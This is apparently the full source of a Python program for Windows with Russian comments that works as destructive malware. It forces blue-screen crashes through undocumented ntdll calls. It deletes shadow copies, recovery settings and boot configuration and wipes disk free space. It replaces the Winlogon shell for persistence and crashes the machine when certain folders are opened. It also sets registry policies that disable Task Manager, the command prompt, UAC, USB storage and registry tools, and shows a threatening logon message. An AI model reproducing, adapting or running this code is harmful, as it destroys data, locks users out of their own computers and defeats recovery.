import subprocess
import winreg as reg
import keyboard
import time
import psutil
import win32com.client
import os
import sys
from ctypes import windll, c_int, c_uint, c_ulong, POINTER, byref


def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        base_path = os.path.join(sys._MEIPASS, "resources")
    else:
        base_path = os.path.join(os.path.abspath("."), "resources")
    return os.path.join(base_path, relative_path)


def BSOD():
    null_pointer = POINTER(c_int)()
    privilege_id = c_uint(19)
    enable_privilege = c_uint(1)
    current_thread = c_uint(0)
    privilege_status = c_int()
    windll.ntdll.RtlAdjustPrivilege(
        privilege_id,
        enable_privilege,
        current_thread,
        byref(privilege_status)
    )

    error_code = c_ulong(0xC000007B)
    arg_count = c_ulong(0)
    response_status = c_uint()
    windll.ntdll.NtRaiseHardError(
        error_code,
        arg_count,
        null_pointer,
        null_pointer,
        c_uint(6),
        byref(response_status)
    )


def block_keys():
    keys_to_block = ['win', 'tab', 'shift', 'f4']
    for key in keys_to_block:
        keyboard.block_key(key)


def ctrt_alt_BSOD():
    keyboard.add_hotkey('ctrl+alt+delete',BSOD)
    keyboard.add_hotkey('ctrl+alt+insert', BSOD)
    keyboard.wait()

def destroy_all_recovery():
    try:
        flags = subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE
        # Уничтожение точек восстановления
        subprocess.run(['vssadmin', 'delete', 'shadows', '/all', '/quiet'], creationflags=flags, check=True)
        # Отключение защиты восстановления
        subprocess.run(['reagentc', '/disable'], creationflags=flags, check=True)
        # Уничтожение BCD хранилища
        subprocess.run(['bcdedit', '/delete', '/cleanup'], creationflags=flags, check=True)
        # Физическое стирание разделов
        subprocess.run(['cipher', '/w:C:'], creationflags=flags, check=True)
        # Уничтожение реестра восстановления
        subprocess.run([
            'reg', 'delete',
            'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore',
            '/f'
        ], creationflags=flags, check=True)
    except Exception as e:
        print(f"Критическая ошибка: {str(e)}")


def change_shell_aftervideo():
    try:
        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
        reg.SetValueEx(key, "shell", 0, reg.REG_SZ, "explorer.exe, C:/Windows/INF/c_computeaccelerator.exe")
        reg.CloseKey(key)
    except Exception as e:
        print(f"Ошибка при установке значения реестра: {e}")


def change_shell():
    try:
        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
        reg.SetValueEx(key, "shell", 0, reg.REG_SZ, "C:/Windows/INF/c_computeaccelerator.exe")
        reg.CloseKey(key)
    except Exception as e:
        print(f"Ошибка при установке значения реестра: {e}")


def update_icons():
    ico1 = r"C:\Windows\INF\1.ico"
    ico2 = r"C:\Windows\INF\2.ico"
    ico4 = r"C:\Windows\INF\4.ico"
    ico6 = r"C:\Windows\INF\6.ico"
    icon_paths = {
        "exefile": ico2,
        "txtfile": ico1,
        "batfile": ico1,
        "blendfile": ico2,
        "dllfile": ico2,
        "AutoHotkeyScript": ico2,
        "pngfile": ico2,
        "jpegfile": ico1,
        "giffile": ico2,
        "bittorrent": ico2,
        "cmdfile": ico2,
        "dbfile": ico2,
        "Drive": ico2,
        "DVD": ico2,
        "docxfile": ico1,
        "htmlfile": ico1,
        "http": ico1,
        "mhtmlfile": ico1,
        "Folder": ico6,
        "https": ico6,
        "icofile": ico6,
        "inifile": ico6,
        "mscfile": ico6,
        "ms-excel": ico2,
        "ms-publisher": ico2,
        "ms-word": ico2,
        "ms-access": ico2,
        "MSInfoFile": ico6,
        "Python.File": ico1,
        "regfile": ico2,
        "steamlink": ico6,
        "steam": ico4,
        "svgfile": ico6,
        "themefile": ico6,
        "themepackfile": ico6,
        "VBSFile": ico1,
        "xmlfile": ico6,
        "WinRAR": ico1,
        "Windows.VhdFile": ico6,
        "SearchFolder": ico6,
        "Paint.Picture": ico6,
        "inffile": ico1,
        "JSFile": ico1,
        "JSEFile": ico1,
        "ftp": ico2,
        "Word.Document.8": ico2,
        "Word.Document.12": ico2,
        "Word.RTF.8": ico2,
        "wordhtmlfile": ico2,
        "wordhtmltemplate": ico2,
        "wordmhtmlfile": ico2,
        "Wordpad.Document.1": ico2,
        "wordxmlfile": ico2,
        "uTorrent": ico1
    }

    for file_type, icon in icon_paths.items():
        key_path = f"{file_type}\\DefaultIcon"
        try:
            reg_key = reg.CreateKeyEx(reg.HKEY_CLASSES_ROOT, key_path, 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(reg_key, "", 0, reg.REG_SZ, icon)
            reg.CloseKey(reg_key)
            print(f"[OK] {file_type} -> {icon}")
        except Exception as e:
            print(f"[FAIL] {file_type} -> {e}")


def monitor_explorer(poll_interval=0.5):
    # Список папок для отслеживания
    target_folders = {r"C:\Windows", r"C:\Windows\INF", r"C:\test"}
    # Приводим пути к нижнему регистру для сравнения
    target_folders = {folder.lower() for folder in target_folders}
    # Флаг, чтобы функция вызывалась один раз при обнаружении целевой папки
    triggered = False
    shell = win32com.client.Dispatch("Shell.Application")

    while True:
        found_targets = set()
        for window in shell.Windows():
            try:
                doc = window.Document
                # Проверяем, что окно связано с папкой (есть атрибут Folder)
                if hasattr(doc, "Folder"):
                    folder_url = window.LocationURL
                    # Преобразуем URL в локальный путь Windows
                    if folder_url.startswith("file:///"):
                        local_path = folder_url.replace("file:///", "")
                        local_path = local_path.replace("/", "\\")
                        # Приводим к нижнему регистру для сравнения
                        local_path = local_path.lower().rstrip("\\")
                        if local_path in target_folders:
                            found_targets.add(local_path)
            except Exception:
                continue

        # Если хотя бы одна целевая папка открыта и функция ещё не вызывалась
        if found_targets and not triggered:
            BSOD()
            triggered = True
        # Если ни одна целевая папка не открыта – сбрасываем флаг для будущих срабатываний
        if not found_targets:
            triggered = False
        time.sleep(poll_interval)

def check_vbs():
    while True:
        found = False
        for p in psutil.process_iter(['name']):
            try:
                if 'wscript.exe' in p.info['name'].lower():  
                    found = True
                    break
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        if not found:
            BSOD()
            break  
        time.sleep(1)


def MinusRegedit():
    reg_commands = [
        ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", "REG_DWORD", 1),
        ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoDriveTypeAutoRun", "REG_DWORD", 255),
        ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLogoff", "REG_DWORD", 1),
        ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoControlPanel", "REG_DWORD", 1),
        ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoStartMenuMyGames", "REG_DWORD", 1),
        ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoStartMenuMyMusic", "REG_DWORD", 1),
        ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoStartMenuNetworkPlaces", "REG_DWORD", 1),
        ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "HideClock", "REG_DWORD", 1),
        ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", "REG_DWORD", 1),
        ("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "HideFastUserSwitching", "REG_DWORD", 1),
        ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableChangePassword", "REG_DWORD", 1),
        ("HKCU\\Software\\Microsoft\\ф\\CurrentVersion\\Policies\\System", "DisableLockWorkstation", "REG_DWORD", 1),
        ("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", "REG_DWORD", 0),
        ("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore", "DisableConfig", "REG_DWORD", 1),
        ("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoDrives", "REG_DWORD", 0),
        ("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoDesktop", "REG_DWORD", 0),
        ("HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "DisableCMD", "REG_DWORD", 2),
        ("HKLM\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR", "Start", "REG_DWORD", 4),
        ("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "LegalNoticeCaption", "REG_SZ", "YOU!!!"),
        ("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "LegalNoticeText", "REG_SZ", "I DESTROY YOU"),
        ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoRun", "REG_DWORD", 1),
        ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", "REG_DWORD", 1),
    ]
    for path, key, type_, value in reg_commands:
        cmd = f'REG ADD "{path}" /v {key} /t {type_} /d {value} /f'
        try:
            subprocess.run(cmd, check=True, shell=True, capture_output=True, text=True)
            print(f"Выполнено: {cmd}")
        except subprocess.CalledProcessError as e:
            print(f"Ошибка: {e}")


def configure_system_settings_after_50():
    def apply_registry_settings(path, settings, hive=reg.HKEY_CURRENT_USER):
        try:
            try:
                key = reg.OpenKey(hive, path, 0, reg.KEY_SET_VALUE)
            except FileNotFoundError:
                key = reg.CreateKey(hive, path)
            for name, value, type_ in settings:
                reg.SetValueEx(key, name, 0, type_, value)
            reg.CloseKey(key)
        except Exception as e:
            print(f"Ошибка в {path}: {e}")
    # Настройки проводника
    explorer_settings = [
        (r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", [
            ("NoFolderOptions", 1, reg.REG_DWORD),           # Запрет настроек проводника
            ("DisableSearchBoxSuggestions", 1, reg.REG_DWORD) # Отключение поиска
        ]),
        (r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", [
            ("Hidden", 0, reg.REG_DWORD),                    # Скрытие скрытых файлов
            ("ShowSuperHidden", 0, reg.REG_DWORD)            # Скрытие системных файлов
        ])
    ]
    for path, settings in explorer_settings:
        apply_registry_settings(path, settings)
    # 2. Настройка всякой персонализации
    accent_color = 0x0000FF  # Красный
    dwm_settings = [
        ("AccentColor", accent_color, reg.REG_DWORD),        # Цвет акцента
        ("ColorPrevalence", 1, reg.REG_DWORD),               # Использование акцентного цвета
        ("ColorizationColor", accent_color, reg.REG_DWORD),  # Цвет фона
        ("ColorizationTransparency", 50, reg.REG_DWORD)      # Прозрачность (0-100)
    ]
    apply_registry_settings(r"Software\Microsoft\Windows\DWM", dwm_settings)
    apply_registry_settings(
        r"Control Panel\Colors",
        [("Window", "255 0 0", reg.REG_SZ)]  # Цвет фона окон (RGB: 255, 0, 0)
    )
    # 3. Блокировка персонализации
    active_desktop_settings = [
        ("NoChangingWallPaper", 1, reg.REG_DWORD),  # Запрет смены обоев
        ("NoChangingColor", 1, reg.REG_DWORD)       # Запрет смены цвета
    ]
    apply_registry_settings(r"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop", active_desktop_settings)
    explorer_policy_settings = [
        ("NoThemesTab", 1, reg.REG_DWORD)  # Запрет вкладки «Темы»
    ]
    apply_registry_settings(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", explorer_policy_settings)

